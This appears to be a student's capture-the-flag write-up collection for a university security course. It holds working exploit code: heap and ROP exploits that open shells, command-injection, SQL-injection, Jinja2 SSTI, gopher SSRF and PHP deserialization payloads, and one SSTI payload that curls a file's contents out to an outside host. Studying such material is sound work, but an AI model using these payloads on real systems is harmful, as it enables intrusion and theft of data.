/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_fmt_leak/share/chal 0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_fmt_leak/share/chal gef➤ p/x 0x00005555555551e9-0x0000555555554000 $8 = 0x11e9 gef➤ p \u0026amp;flag $9 = (\u0026lt;data variable, no debug info\u0026gt; *) 0x555555558040 \u0026lt;flag\u0026gt; gef➤ p/x 0x555555558040-0x0000555555554000 $10 = 0x4040 從以上結果得知，leak出來的位址，他距離base address的offset是0x11e9，而flag的位置在0x555555558040，他的offset就是0x4040 Construct Payload 經過換算$(0x00007fffffffd778 - 0x00007fffffffd640) / 8 + 6 = 45$，這樣我們就可以把該位置的value leak出來 payload = b\u0026#39;%p.\u0026#39; * (39 + 6) + b\u0026#39;\\n\u0026#39; Calculate Flag Address text_offset = 0x11e9 flag_offset = 0x4040 text_addr = int(r.recvline().split(b\u0026#39;.\u0026#39;)[-2], 16) text_base = text_addr - text_offset flag_addr = text_base + flag_offset Write Flag Address to Stack 做這一步的意思是因為flag本身不在stack上，他是在其他section上，所以我們只能用%s讓他讀flag address指向的value，但首先我們要利用BOF的漏洞寫上flag address，再利用FMT讀出來，這個地方和上課時助教寫的不太一樣，其實不需要這麼的麻煩，利用k$就可以指定要讀取哪一個stack value，所以以下的payload中出現的18, 0x50是有連動關係的，且可以自定義，但不建議寫的太近(距離我們輸入的stack address)，因為有可能最後被不明原因而蓋掉 payload = b\u0026#39;%18$s\u0026#39; payload = payload.ljust(0x50, b\u0026#39;\\x00\u0026#39;) payload += p64(flag_addr) 實際寫上stack後會變成 0x00007fff99758830│+0x0000: 0x00000000000c0000 ← $rsp 0x00007fff99758838│+0x0008: 0xffffffff00000008 0x00007fff99758840│+0x0010: 0x0000007324383125 (\u0026#34;%18$s\u0026#34;?) ← $rsi 0x00007fff99758848│+0x0018: 0x0000000000000000 0x00007fff99758850│+0x0020: 0x0000000000000000 0x00007fff99758858│+0x0028: 0x0000000000000000 0x00007fff99758860│+0x0030: 0x0000000000000000 0x00007fff99758868│+0x0038: 0x0000000000000000 0x00007fff99758870│+0x0040: 0x0000000000000000 0x00007fff99758878│+0x0048: 0x0000000000000000 0x00007fff99758880│+0x0050: 0x0000000000000000 0x00007fff99758888│+0x0058: 0x0000000000000000 0x00007fff99758890│+0x0060: 0x000055e273743040 → \u0026lt;flag+0\u0026gt; add BYTE PTR [rax], al 可以稍微手動算一下，0x00007fff99758890│+0x0060以fmt的角度來說就是5+13=18，代表他是第18個，此時我們就拿到flag了 :::spoiler TA的payload version payload = b\u0026#39;%p\u0026#39; * 0x17 + b\u0026#39;.\u0026#39; + b\u0026#39;%s\u0026#39; payload = payload.ljust(0x80, b\u0026#39;\\x00\u0026#39;) payload += p64(flag_addr) ::: HW-HACHAMA # Flag: flag{https://www.youtube.com/watch?v=qbEdlmzQftE\u0026amp;list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT\u0026amp;index=1}\n解題流程與思路 # :::warning 切記題目用read接，所以不需要null byte做結尾，另外題目使用的libc是ubuntu 22.04.2的版本，所以可以用docker把libc資料撈出來，再針對這個做應用 ::: 這一題我覺得出的很好，有很特別的exploit，也需要用到很多前兩周學會的幾乎所有技能，包含BOF / return 2 libc / stack pivot / ROP等等\n==漏洞在哪裡???== 首先，乍看之下會不知道這個洞在哪裡，不過多try幾次或是跟一下動態會發現，他做的事情會蓋到原本==n2==的數值，導致我們之後可以輸入更多的東西 詳細來說就是: 因為在#61的地方輸入的東西被存到local variable name，而在#63會被copy到global variable ==msg==，並且和 hachamachama合併在一起，如果一開始我們輸入的東西是20個字元，而concatenate的 hachamachama總共13個字元，加起來就已經是==33==個字元，但如下圖所示，msg一開始的大小就被限制在32 bytes，也就是說他會蓋到後面n2的值 從下圖可以看出來，因為長度超過的關係，原本hachamachama的最後一個字元，也就是0x61往後蓋到n2的值，這代表我們在往後的地方可以多加利用 知道漏洞在哪裡之後，我們就可以利用這個洞，把stack的東西leak出來\npayload = b\u0026#39;HACHAMA\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) r.send(payload) result = r.recv(0x61) log.info(\u0026#34;[-------------Stack Info-------------]\u0026#34;) for i in range(12): log.info(hex(u64(result[i * 8:i * 8 + 8]))) log.info(\u0026#34;[-------------Stack Info-------------]\u0026#34;) canary = u64(result[7 * 8:7 * 8 + 8]) libc_start_main = u64(result[9 * 8:9 * 8 + 8]) - 0x80 libc_base_addr = libc_start_main - 0x29d90 + 0x80 main_fn_addr = u64(result[11 * 8:11 * 8 + 8]) code_segment_base = main_fn_addr - 0x331 log.success(f\u0026#39;Canary = {hex(canary)}\u0026#39;) log.success(f\u0026#39;libc start main base = {hex(libc_start_main)}\u0026#39;) log.success(f\u0026#39;libc base addr = {hex(libc_base_addr)}\u0026#39;) log.success(f\u0026#39;Main Function Address = {hex(main_fn_addr)}\u0026#39;) log.success(f\u0026#39;Code Segment = {hex(code_segment_base)}\u0026#39;) 有了canary / libc base 和code segment base / main function address，就可以來搞事了，初步的想法是直接寫一個open / read / write的syscall(因為seccomp的關係導致我們的操作極其有限)，不過因為我們也只是多了0x31的空間可以寫ROP，代表一定沒辦法把所有的shellcode都寫上去，這時候就需要用到stack pivot的技術，開一個相對大的空間繼續我們的作業，但就像@ccccc說的\nstack pivot只是把你的stack用到其他地方而已，並不會因為你換了stack的位置你就能overflow比較多\n所以比較正確的觀念是，我先利用多出來的0x31把可以用的空間開大，再寫gadget，會比較方便，如果是像lab那樣每一個步驟都切成一個stack pivot的話也不現實，因為一個操作所需要的空間一定大於0x31，隨便舉個例子，如果是open→fd = open(\u0026quot;/home/chal/flag.txt\u0026quot;, 0);，全部的payload如下:\npayload = b\u0026#39;/home/chal/flag.txt\u0026#39;.ljust(0x38, b\u0026#39;\\x00\u0026#39;) payload += flat( canary, 0, pop_rax_ret, 2, pop_rdi_ret, bss_addr_flag - 0x40, pop_rdx_rbx_ret, 0, 0, pop_rsi_ret, 0, syscall_ret ) 最少也需要0x98的空間，所以擴大可以寫的空間是必要的，但我還是稍微嘮叨一下，一開始我的想法是直接把n2的數值改掉，這樣就可以解決上述的問題，但實際操作會發現這也不現實，因為payload也會過長，如下\npayload = b\u0026#39;a\u0026#39; * 0x38 payload += flat( canary, rbp, pop_rdi_ret, n2_addr, pop_rdx_ret, 0x200, mov_qword_ptr_rdi_rdx_ret, main_fn_addr + 291, ) 這樣最少也需要0x78的空間，比起最大值的0x61還差蠻多的，所以昨天就想了超久怎麼解決這個問題\n解決空間大小的問題 這個要回到動態實際執行的時候是怎麼呼叫的(如下圖)，這一題有趣的地方在這邊，理論上我們是回到main+291，讓他fetch n2的值給RAX，但如果我直接跳到main+298，並且利用rop把rax變大，是不是也有一樣的效果 extend_payload = flat( canary, bss_addr_flag, pop_rax_ret, 400, main_fn_addr + 298, ) 此時我們就不需要那麼多的gadget幫助完成該目標\n剩下的open / read / write就和lab差不多\n:::success 截至目前為止，我們的流程是\n設法利用overflow改變n2的數值，使我們能夠輸入更多shell code 先利用第一次的write輸入stack上的重要資訊 因為n2空間還是太小，所以我們需要先擴大能夠寫入的空間，也就是先利用第一次的stack pivot把shellcode寫上去→main+291 執行shellcode後，使rax變大再跳回去main+298 寫入真正的open / read / write讀出flag ::: :::warning 注意事項:\ncanary 因為他有開stack protection，所以一定要對好canary在stack上的位置，可以用動態去看，依照這一題的狀況，他是會在rbp+0x40的地方 libc version 這一題因為要leak libc的base address，並且利用ROP gadget達到syscall的目的，所以一定要確定remote server使用的版本是哪一個，光知道大的版本號是有可能會失敗的，因為像我local端到最後有成功，但跑在remote就爛掉了，和@david學長討論過後的結果就是libc version有問題，實際用docker去看彼此的差異就會發現，右邊是我的→22.04.3，而左邊是實際remote的docker開出來的結果→22.04.2，所以我的作法是把docker中的東西拉出來再使用，包含在local端使用以及找gadget $ docker cp /lib/x86_64-linux-gnu/libc.so.6 /mnt/d/Downloads/ IO problem 這個問題也是很弔詭，會發現我在最後一個send之前還有一個raw_input()，如果拿掉的話在remote一樣會爛掉，這有可能是IO之類的問題，但總之一定要加 ::: Lab-UAF # Flag: flag{https://www.youtube.com/watch?v=CUSUhXqThjY}\n解題流程與思路 # 這是個經典的表單題，總共有四種command(註冊entity / 刪除entity / 設定entity name / 觸發entitiy function pointer)，這種題目因為格局比較大，所以我都會先看哪裡有malloc或是free，首先\n==註冊entity==→malloc ==設定entity name==→malloc ==刪除entity==→free 然後觀察一下題目一開始會給我們system的address，和一開始的heap address，並且最後可以觸發entity的function pointer，所以目標很清楚 ==設法把function pointer的地址改成system，並且event的部分改成儲存/sh\\x00的地址== 最後只要trigger就會自動開一個shell給我們\n根據background，我們要利用的漏洞就是最後一個，也就是利用相同的大小，把已經free掉的部分拿回來加已利用\n先註冊兩個entity(0和1)，第0個是要利用的部分 把/sh\\x00寫上entity 刪除entity 0 設定system的function pointer 這要特別說明，前面三個步驟都算是正常的步驟，而如果我們設定entity的name，此時系統會malloc一塊空間寫我們輸入的entity name，以這一題來說就會是entity 0(只要大小設定的一樣就好)，因此我們可以寫入包含system address和/sh\\x00的位置，最後再以entity 0的身分trigger該function pointer就可以拿到shell了 gef➤ x/gx 0x00007f706a449d70 0x7f706a449d70 \u0026lt;__libc_system\u0026gt;: 0x74ff8548fa1e0ff3 gef➤ x/s 0x560bb1125300 0x560bb1125300: \u0026#34;sh\u0026#34; 最後我們再利用entity 0的名義，trigger function pointer，就拿到shell了 Lab-Double Free # Flag: flag{a_iU8YeH944}\n解題流程與思路 # :::warning Run On Ubuntu 20.04 ::: 這一題有很多種方式可以拿到shell，不過原理都是一樣的，前置作業都是一樣的，也就是要利用UAF去leak出libc address，接著算出__free_hook以及system的位址，接著想辦法把system寫到__free_hook的位址，此時就有兩種方式可以寫，一種是利用此次學到的double free，把值寫到最後一個在tcache的free chunk，蓋掉他的fd，接著就可以用add_note把tcache的值要回來，並寫system的address進到__free_hook；另一種方式就比較簡單，也就是把free chunk的fd利用UAF的特性改掉，並且直接add_note把東西從tcache要回來，之後就一樣寫system_addr，後free掉一個帶有/bin/sh的chunk，此時就會開一個shell給我們了\n前置作業: Leak Libc Address # 關於這一點可以參考如何用UAF leak libc address?，方法都一樣，首先要想辦法讓free chunk進到unsorted bin中(最簡單的方法就是設定超過0x410的空間)，接著因為malloc的時候沒有實作清空原本的資料，導致我們可以leak其中有關libc section的資訊。底下的設定意思是我們先設定三個notes，#14的意思是不要讓#13被free掉的時候被consolidate用的，接著我們把前兩個free掉，結果如下 會發現#12和#13被consolidate在一起了，接著我們看其中的一些資訊 裡面確實存著libc相關的資訊，接著只要把這一塊chunk malloc出去給隨便一個note，接著讀其中的資料就可以讀出libc address了\nadd_note(12, 0x420) add_note(13, 0x420) add_note(14, 0x420) del_note(12) del_note(13) add_note(12, 0x420) read_note(12) leak_libc = u64(r.recv(8)) libc_base = leak_libc - 0x1ed0e0 system_addr = libc_base + libc.symbols[\u0026#39;system\u0026#39;] free_hook = libc_base + 0x1eee48 log.success(f\u0026#39;Leak Libc = {hex(leak_libc)}\u0026#39;) log.success(f\u0026#39;Libc Base = {hex(libc_base)}\u0026#39;) log.success(f\u0026#39;System Address = {hex(system_addr)}\u0026#39;) log.success(f\u0026#39;Free Hook = {hex(free_hook)}\u0026#39;) r.recv(0x420 - 0x8) 方法一: Double Fee # 有了libc address後，我們要想辦法把system address寫到__free_hook的位置，如果是要用double free的方法的話可以參考上課的講義: 最簡單的方法是，我把tcache填滿(一定要)，然後用free(a)→free(b)→free(a)的順序產生double free\nfor i in range(1, 0xa): add_note(i, 0x10) for i in range(1, 0x8): del_note(i) del_note(8) del_note(9) del_note(8) 此時的heapinfo會變成: 接著我們把tcache清空後再繼續add_note就會把fastbin的free chunk搬到tcache中\nadd_note(8, 0x18) 接著我們寫free_hook address到note #8，這樣的話，tcache的順序就會變成下圖:\nwrite_note(8, p64(free_hook)) 此時我們就把free chunk變成free_hook的地址，我們只不斷的add_note，就可以把tcache的free chunk要回來進行寫入，也就是寫system address:\nbin_sh = u64(b\u0026#39;/bin/sh\\x00\u0026#39;) add_note(9, 0x10) write_note(9, p64(bin_sh)) add_note(10, 0x10) add_note(11, 0x10) write_note(11, p64(system_addr)) 最後的結果如上圖，會發現note #11已經變成==0x7f900aa8ae48==，這個就是__free_hook的位址，進去看發現已經被我們寫入system address，這個時候我們只要把含有/bin/sh\\x00的note #9 free掉，就可以開shell了\n方法二: 一般的寫入 # 這一個方法比較方便，也和double free沒關係，反正我們只要利用UAF的特性，也可以把free chunk的fd改掉，再用像前面的方法就可以開shell\n下面的建構就是先開兩個note，然後free掉，此時我們就可以利用UAF的漏洞把free chunk的fd改掉，結果如下圖 add_note(1, 0x18) add_note(2, 0x18) del_note(2) del_note(1) write_note(1, p64(free_hook) + p64(0) * 2) 接著就把/bin/sh\\x00寫到note #2，接著就不斷add_note，把__free_hook的address拿到手，然後再把system address寫到__free_hook，最後把含有/bin/sh\\x00的note #2 free掉，結果如下圖: 從上圖得知，note #4的address已經被我們換成__free_hook address，並且實際跟進去就是system address，最後只要free掉note #2就可以開shell了\nHW-UAF++ # Flag: flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}\n解題流程與思路 # :::info\n這一題是run在==20.04==的環境，在做題目之前要先看一下docker file 另外一個很重要的一點是題目是用==read==讀取輸入，所以我們不需要輸入null byte結尾 ::: 這一題和lab有幾個關鍵的地方不太一樣，首先他把set_name的操作併到register的地方，另外他限制註冊的entity只能有==2個==，最重要的一點是他沒有給我們heap address或system address的天大好禮，所以我們還要想一下其他的方法\n首先，思路會是先想辦法leak libc address，並且利用像lab的方式把system function trigger起來開一個shell給我們\nleak libc的策略如下，就像background提到的，要leak libc就要先想辦法把chunk丟到unsorted bin中，所以大小不能太小，lab的作法是先把tcache填滿再free一個0x88(就是不會被丟到fastbin的大小)，不過因為這一題只能讓我們註冊兩個entity，所以有沒有甚麼方式是可以直接丟到unsorted bin?那就是直接註冊超過0x410的大小，這樣free的時候就會被丟到unsorted bin\nregister(0, 0x420, b\u0026#39;a\u0026#39;) register(1, 0x420, b\u0026#39;a\u0026#39;) delete(0) delete(1) register(0, 0x420, b\u0026#39;a\u0026#39;) trigger_event(0) 下圖為停在delete完後的結果，因為entity 1的0x420被consolidate所以沒有被顯示出來 而再註冊一次的意思是要把unsorted bin的空間拿回來，又因為他沒有把空間洗掉，所以我們後面再trigger的時候他會把東西印出來給我們，從下圖可以知道entity 0的name指向==0x00005575416a52c0==，也就是一開始從unsorted bin拿到的chunk address，而裡面的數值也的確還殘留 如果實際trigger entity 0會如下圖一樣，print出name指向的東西 既然可以leak出libc的地址，當然我們也可以寫值進去，我們的目標是開一個shell，而唯一可以執行function的就是在trigger event的地方，假設我們可以寫成如下圖一樣，是不是就可以觸發shell了 要達成如上的效果，我會先reset各個entity，為甚麼要設定0x20之後會用到\nregister(0, 0x20, b\u0026#39;a\u0026#39;) register(0, 0x20, b\u0026#39;a\u0026#39;) register(1, 0x20, b\u0026#39;a\u0026#39;) 仔細看source code中註冊的部分，他一共會malloc兩個空間，一個是固定0x20的entity，另外一個就是我們自己設定的name空間，這個空間可以寫值；另外call function pointer的時候，也就是在trigger event的地方，他只會針對剛剛提到的0x20 entity space去call function，所以我們要想辦法把我們寫進去的值==被當成0x20的entity==，這樣的話就可以直接call system了，這最後一步想了超級久，原本是想隔天在戰，結果躺在床上五分鐘就來靈感了，再花五分鐘就把問題解掉了😑\n具體流程如下\ndelete(1) delete(0) register(0, 0x18, p64(0) + p64(bin_sh_addr) + p64(system_addr)) trigger_event(1) 首先把這兩個entity都free掉，這樣回收區就會如下圖一樣 接著我們註冊entity 0，又因為這一次要的空間是0x18，所以他會把前面entity 1的空間都拿回來使用，如果我們又把開shell的資訊寫進去，就會如下圖 此時原本被free掉的entity 1的空間就會變成entity 0的name space，此時我們只要trigger entity 1就會開shell了，如下圖 "},{"id":187,"href":"/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/","title":"NTU CS 2023 HW4 Write Up","section":"Securities","content":" NTU CS 2023 HW4 Write Up # Lab-Cat Shop # Flag: FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}\n解題流程與思路 # 這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選 但因為送出的item number可預期，所以還是能夠正常query 接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag Lab-DNS Lookuper # Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}\n解題流程與思路 # Use $ or ` string to bypass blacklist Payload: '$(cat /fla*)' 'cat /fl*g*'\nLab-Log me in # Flag: FLAG{b4by_sql_inj3cti0n}\n解題流程與思路 # Payload → ') or ('1'='1') -- # SELECT * FROM admin WHERE (username=\u0026rsquo;\u0026rsquo;) or (\u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\u0026rsquo;) \u0026ndash; #\u0026rsquo;) AND (password=\u0026lsquo;MTIz\u0026rsquo;) Lab-Jinja2 SSTI # Flag: FLAG{ssti.__class__.__pwn__}\n解題流程與思路 # Easy way # payload: {{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen'](\u0026quot;cat /th1s_15_fl4ggggggg\u0026quot;).read()}} Need Tool way - Beeceptor # Beeceptor will catch our result from curl. It\u0026rsquo;ll execute cat /th1s_15_fl4ggggggg first and the result will be sent to Beeceptor as attached data by curl. Payload:\n{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__[\u0026#39;system\u0026#39;](\u0026#39;curl {Beeceptor URL} -d \u0026#34;`cat /th1s_15_fl4ggggggg`\u0026#34;\u0026#39;)}} Lab-Preview Card # Flag: FLAG{gopher://http_post}\n解題流程與思路 # When you see a preview function, then it may have SSRF problem.\nTest it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code\n\u0026lt;?php if ($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] !== \u0026#39;127.0.0.1\u0026#39;) die(\u0026#34;Only for localhost user.\u0026#34;); ?\u0026gt; \u0026lt;form action=\u0026#34;/flag.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; Do you want the FLAG? \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;givemeflag\u0026#34; value=\u0026#34;no\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if (isset($_POST[\u0026#39;givemeflag\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;givemeflag\u0026#39;] === \u0026#39;yes\u0026#39;) echo \u0026#34;FLAG:\u0026#34;, getenv(\u0026#39;FLAG\u0026#39;); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.\nConstruct package - gopher\nPOST /flag.php HTTP/1.1 Host: 127.0.0.1 Content-Length: 14 Content-Type: application/x-www-form-urlencoded givemeflag=yes Transferred by urlencode with CRLF type. Payload: gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Length%3A%2014%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0agivemeflag%3Dyes%0d%0a\nThen we got flag\u0026hellip;\nLab-Magic Cat # Flag: FLAG{magic_cat_pwnpwn}\n解題流程與思路 # Test payload in local side\n$ ./psysh \u0026gt; class Caster . { . public $cast_func = \u0026#39;intval\u0026#39;; . function cast($val) . { . return ($this-\u0026gt;cast_func)($val); . } . } \u0026gt; $test = new Caster = Caster {#2772 +cast_func: \u0026#34;intval\u0026#34;, } \u0026gt; $test-\u0026gt;cast_func = \u0026#39;system\u0026#39; = \u0026#34;system\u0026#34; \u0026gt; $test-\u0026gt;cast(\u0026#39;pwd\u0026#39;) = \u0026#34;/home/sbk6401\u0026#34; Construct serialized session\n\u0026gt; class Cat . { . public $magic; . public $spell; . function __construct($spell) . { . $this-\u0026gt;spell = $spell; . $this-\u0026gt;magic = new Caster(); . } . function __wakeup() . { . echo \u0026#34;Cat Wakeup!\\n\u0026#34;; . $this-\u0026gt;magic-\u0026gt;cast($this-\u0026gt;spell); . } . } \u0026gt; $cat = new Cat(\u0026#34;ls -al /\u0026#34;) = Cat {#2771 +magic: Caster {#2763 +cast_func: \u0026#34;intval\u0026#34;, }, +spell: \u0026#34;ls -al /\u0026#34;, } \u0026gt; $cat-\u0026gt;magic-\u0026gt;cast_func = \u0026#34;system\u0026#34; = \u0026#34;system\u0026#34; \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjg6ImxzIC1hbCAvIjt9\u0026#34; Get flag\n\u0026gt; $cat-\u0026gt;spell = \u0026#34;cat /flag*\u0026#34; = \u0026#34;cat /flag*\u0026#34; \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9\u0026#34; HW-Double Injection - FLAG1 # Flag: FLAG{sqlite_js0n_inject!on}\n解題流程與思路 # 這一題超爆難，應該可以預見被splitline凌虐，先看Dockerfile寫了甚麼，安裝的前置作業結束以後，分別把FLAG1和FLAG2的內容丟到/flag1.txt,/flag2-{random string}.txt中，並且執行db的初始化，也就是把FLAG1當成admin的密碼，接著比較重要的一步是把存取db內容的file(/etc/db.sqlite3)的權限設定read-only，這個操作後續會說明重要的地方，最後就是執行app.js\n目標: 我們的目標是想辦法把FLAG1拿到手，但看了一圈app.js也沒有任何想法，雖然我知道username的地方有SQLinjection的洞，但重要的是如何把密碼送到前端給我們 一開始的想法: 送出post request後，會進到login route，並且db會對送來的username / password進行query，此時會發現有兩個if statement，當時我在想，只要滿足第一個if statement，他就會return並且render出原本的username，所以如果我可以創一個新的table或是insert原本的users table，並且把username設定成FLAG1，然後password設定已知，這樣的話就一定會進到第二個if statement，如此就算我不知道FLAG1是多少，他也會把username吐回來到前端 if (row.password === password) { if (password !== FLAG1) { const html = ejs.render(`\u0026lt;h1\u0026gt;Success!\u0026lt;/h1\u0026gt;`, { username }); return res.send(html); } else { const html = ejs.render(template, { username }); return res.send(html); } } else { return res.status(401).send(\u0026#39;Unauthorized\u0026#39;); } 但這個做法有兩個原因導致無法實踐 前面講過，splitline把/etc/db.sqlite3設定成read-only，所以我們無法對他做任何修改 就算這個file可以修改，因為ejs.render的關係，如果給定的1st參數沒有format可以填入(就像第二個if出現的template)，他並不會把username一起render進去，雖然我也不確定為甚麼要這樣寫 比較可行的方式 逛了好幾圈app.js都沒有任何可以把username吐回前端的地方，代表這個思路應該不是可行的方式，此時可以想想看time based或是boolean based 這種blind injection，可能是個不錯的方式，雖然我也有嘗試union based，不過效果不大 因為是完全沒有任何filter的sql injection，所以我就直接在local的sqlite db browser下語法順便debug，當payload如下時: admin.username\u0026#34;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db -- # 在server端會變成 \u0026#34;$.admin.username\\\u0026#34;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db -- # .password\u0026#34; 完整的query會變成 SELECT json_extract(users, \u0026#34;$.admin.username\\\u0026#34;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db -- # .password\u0026#34;) AS password FROM db 則query到的data如下 { a: null, b: \u0026#39;admin\u0026#39;, c: \u0026#39;FLAG{flag-1}\u0026#39; } 第一個參數a為null是因為app.js中，我們的payload經過==JSON.stringify==，會在雙引號前加一個反斜線，這會導致query時，db不知道==$.admin.username==是甚麼東西，只有單引號沒有這個問題，但如果第一個query data不加上雙引號就會導致閉合不全而導致結果異常(如下) 所以我乾脆第一個參數就算了，重新利用後兩個參數要到username和password 有了這個可以幹嘛呢?我們可以下條件，當條件符合的時候做A，否則做B，而A和B是有一些差異，可能是時間長度或是網站是否crash為基準，這樣的話我們就可以知道下的條件是否正確，POC如下: 看長度\nSELECT json_extract(users, \u0026#39;$.admin.username\u0026#39;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db WHERE b = \u0026#39;admin\u0026#39; AND IIF(length(c) = 10, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # 在local測試時，FLAG1=FLAG{test}，也就是只有10個字，如果條件設定不符合時，就會query出東西，因為條件不符回傳1，如下圖 反之，就會query不出東西，也就是crash 如果想要知道某一個字元可以substr這個function\nSELECT json_extract(users, \u0026#39;$.admin.username\u0026#39;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db WHERE b = \u0026#39;admin\u0026#39; AND IIF(substr(c, 1, 5) = \u0026#39;FLAG{\u0026#39;, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # 此時就可以開寫script去server端爆破FLAG1 HW-Double Injection - FLAG2 # Flag: FLAG{ezzzzz_sqli2ssti}\n解題流程與思路 # 這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like: 基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:\nadmin.password\u0026#34;) as password, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as password from db; -- # 後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看之前寫的文章\n"},{"id":188,"href":"/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/","title":"NTU CS HW0 Write Up","section":"Securities","content":" NTU CS HW0 Write Up # :::spoiler TOC [TOC] :::\nEasy C2 # Flag: FLAG{C2_cmd_in_http_header} Description # 我們獵捕到一隻惡意程式，它似乎有與 C2 進行互動的行為。請找出它發送給 C2 的訊息。Flag 格式為：FLAG{\u0026hellip;}。 此題模仿惡意程式與 C2 進行溝通的行為，期望能在對不熟悉逆向的同學而言不過度困難的情況下，讓同學對惡意程式行為有初步的認識。題目本身並沒有實際的惡意或影響系統運作的行為，因此可以安心執行。建議同學可以先嘗試執行程式，觀察程式的行為，嘗試找出 C2 位址以及如何與其溝通。\nGoogle 關鍵字：IDA freeware、Ghidra、malware C2\n解題思路 # Simple 解題思路 $ file easy-c2 easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped IDA int __cdecl main(int argc, const char **argv, const char **envp) { int sockfd; // [rsp+1Ch] [rbp-24h] char *flag; // [rsp+20h] [rbp-20h] BYREF char *enc_flag; // [rsp+28h] [rbp-18h] char *host; // [rsp+30h] [rbp-10h] unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); enc_flag = byte_20F0; host = \u0026#34;127.0.0.1\u0026#34;; sockfd = socket_connect(\u0026#34;127.0.0.1\u0026#34;, 11187); decode_flag(\u0026amp;flag, byte_20F0); send_msg(sockfd, flag); puts(\u0026#34;Message sent.\u0026#34;); sleep(1u); free(flag); close(sockfd); return 0; } 可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息 Exploit # $ nc -lvp 11187 Listening on 0.0.0.0 11187 Connection received on localhost 54028 GET / HTTP/1.0 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko, FLAG{C2_cmd_in_http_header}) Chrome/51.0.2704.103 Safari/537.36 Baby Crackme # Flag: FLAG{r0ll1ng_4nd_3xtr4ct_t0_m3m0ry} Description # 透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis\n解題思路 # Simple 解題思路\n$ file baby-crackme baby-crackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6cc98ffd919e39311d3014a8bd77c2c8968ca2a9, for GNU/Linux 3.2.0, stripped $ ./baby-crackme ========= Baby Validating Service ========= Enter the license \u0026gt;1234 Invalid license! IDA :::spoiler IDA Decompile Code(Main Function)\n__int64 __fastcall main(int a1, char **a2, char **a3) { __int64 input_flag[4]; // [rsp+0h] [rbp-30h] BYREF int v5; // [rsp+20h] [rbp-10h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = 